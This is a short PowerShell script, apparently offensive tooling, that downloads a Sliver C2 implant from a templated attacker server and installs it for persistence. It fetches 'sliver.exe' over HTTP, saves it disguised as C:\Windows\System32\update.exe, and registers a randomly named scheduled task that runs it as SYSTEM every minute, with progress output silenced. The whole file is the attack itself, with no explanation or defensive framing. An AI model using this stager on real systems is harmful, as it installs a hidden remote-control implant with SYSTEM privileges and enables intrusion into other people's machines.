$BINARY='C:\Windows\System32\update.exe'
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "http://${server_ip}:8000/sliver.exe" -OutFile $BINARY
schtasks /create /tn $(-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})) /tr $BINARY /sc minute /mo 1 /st $(Get-Date).AddMinutes(1).ToString('HH:mm') /ru 'SYSTEM'